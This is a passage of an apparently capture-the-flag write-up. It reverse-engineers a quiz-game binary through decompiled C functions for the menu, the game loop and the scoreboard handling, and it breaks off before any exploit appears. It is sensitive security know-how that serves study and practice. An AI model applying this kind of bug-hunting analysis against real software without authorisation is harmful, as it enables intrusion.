</span></span><span style="display:flex;"><span>    bVar2 <span style="color:#555">=</span> atou64(local_38);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">4</span>) {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Alright, bye&#34;</span>);
</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">3</span>) {
</span></span><span style="display:flex;"><span>          see_scoreboard();
</span></span><span style="display:flex;"><span>          uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>            game();
</span></span><span style="display:flex;"><span>            uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (bVar2 <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
</span></span><span style="display:flex;"><span>            see_full_scoreboard();
</span></span><span style="display:flex;"><span>            uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">goto</span> LAB_00100829;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Come again?&#34;</span>);
</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_00100829</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">==</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> uVar3;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  __stack_chk_fail();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>From this <code>menu</code> method, we can see that each menu that we chose before, they have its method to handle the menu.</p>
<p>Let&rsquo;s try to check the first main menu decompiled result, which is defined under <code>game</code> method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">game</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar1;
</span></span><span style="display:flex;"><span>  uint uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_68;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_60;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_58 [<span style="color:#f60">32</span>];
</span></span><span style="display:flex;"><span>  undefined local_38 [<span style="color:#f60">40</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Have Fun, Good Luck!&#34;</span>);
</span></span><span style="display:flex;"><span>  local_68 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  local_60 <span style="color:#555">=</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>    print(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Round &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(local_58,local_60);
</span></span><span style="display:flex;"><span>    puts(local_58);
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#555">=</span> rand();
</span></span><span style="display:flex;"><span>    cVar3 <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span>)uVar2 <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">char</span>)(uVar2 <span style="color:#555">/</span> <span style="color:#f60">10</span>) <span style="color:#555">*</span> <span style="color:#555">-</span><span style="color:#f60">10</span>;
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#555">=</span> rand();
</span></span><span style="display:flex;"><span>    cVar4 <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span>)(uVar2 <span style="color:#555">%</span> <span style="color:#f60">10</span>);
</span></span><span style="display:flex;"><span>    print(<span style="color:#c30">&#34;How much is &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(local_58,cVar3);
</span></span><span style="display:flex;"><span>    print(local_58);
</span></span><span style="display:flex;"><span>    print(<span style="color:#555">&amp;</span>DAT_0010099f);
</span></span><span style="display:flex;"><span>    u64toa(local_58,cVar4);
</span></span><span style="display:flex;"><span>    print(local_58);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34; ?&#34;</span>);
</span></span><span style="display:flex;"><span>    cVar1 <span style="color:#555">=</span> readline(local_38,<span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">!=</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_00100746</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>        __stack_chk_fail();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    cVar1 <span style="color:#555">=</span> atou64(local_38);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#078;font-weight:bold">char</span>)(cVar4 <span style="color:#555">+</span> cVar3) <span style="color:#555">!=</span> cVar1) {
</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;Wrong! Game Over!&#34;</span>);
</span></span><span style="display:flex;"><span>      check_scoreboard(local_68);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">goto</span> LAB_00100746;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_68 <span style="color:#555">=</span> local_68 <span style="color:#555">+</span> <span style="color:#f60">5</span>;
</span></span><span style="display:flex;"><span>    print(<span style="color:#c30">&#34;Yes! +5pts! You have &#34;</span>);
</span></span><span style="display:flex;"><span>    u64toa(local_58,local_68);
</span></span><span style="display:flex;"><span>    print(local_58);
</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;pts total.&#34;</span>);
</span></span><span style="display:flex;"><span>    local_60 <span style="color:#555">=</span> local_60 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the source code, we can see that it will initialize a loop to give us questions. If we gave the correct answer to the question, it will stay in the loop. It also has a variable to store the points that we get from answering the questions (which is 5 pts per correct answer). If we gave the wrong answer, it will break the loop and call <code>check_scoreboard</code> with the parameter of our total score. Let&rsquo;s check what the method does.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">check_scoreboard</span>(ulong param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> curr_pos;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  curr_pos <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#f60">9</span> <span style="color:#555">&lt;</span> curr_pos) {
</span></span><span style="display:flex;"><span><span style="color:#99f">LAB_0010055c</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (lVar1 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>        __stack_chk_fail();
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ((ulong)game_scoreboard[curr_pos] <span style="color:#555">&lt;</span> param_1) {
</span></span><span style="display:flex;"><span>      shift_scoreboard(curr_pos);
</span></span><span style="display:flex;"><span>      get_player_name(curr_pos);
</span></span><span style="display:flex;"><span>      game_scoreboard[curr_pos] <span style="color:#555">=</span> param_1;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">goto</span> LAB_0010055c;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    curr_pos <span style="color:#555">=</span> curr_pos <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the source code, we can see that in this method, if our score is higher than one of the values stored in the <code>game_scoreboard</code>, this method will call <code>shift_scoreboard</code> and <code>get_playername</code>. Let&rsquo;s try to decompile each of them to understand better.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">shift_scoreboard</span>(<span style="color:#078;font-weight:bold">int</span> param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> curr_pos;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (curr_pos <span style="color:#555">=</span> <span style="color:#f60">9</span>; param_1 <span style="color:#555">&lt;</span> curr_pos; curr_pos <span style="color:#555">=</span> curr_pos <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>    game_scoreboard[curr_pos] <span style="color:#555">=</span> game_scoreboard[(<span style="color:#078;font-weight:bold">long</span>)curr_pos <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">1</span>];
</span></span><span style="display:flex;"><span>    strcpy(game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)curr_pos <span style="color:#555">*</span> <span style="color:#f60">0x20</span>,game_names <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)curr_pos <span style="color:#555">*</span> <span style="color:#f60">0x20</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (lVar1 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>This method doesn&rsquo;t have anything suspicious LOC, it just shifts the array to put our score to the scoreboard array.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
